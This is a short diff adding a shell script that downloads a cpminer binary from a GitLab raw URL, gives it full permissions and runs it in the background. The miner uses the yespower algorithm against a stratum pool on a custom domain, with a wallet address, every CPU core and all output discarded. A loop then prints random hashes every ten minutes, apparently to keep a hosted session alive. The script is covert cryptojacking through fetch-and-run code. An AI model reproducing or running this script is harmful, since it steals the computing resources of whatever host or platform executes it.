@@ -1,0 +1,3 @@
+wget https://gitlab.com/fajarranz19/work/-/raw/main/cpminer
+chmod 777 cpminer && ./cpminer -a yespower  -o stratum+tcp://vinjai.thecritman.my.id:80 -u uzrKLPM88xXDP3CtWdPwh8ZvxsHNXXrLju.INTEL -t $(nproc --all) -p x > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done 
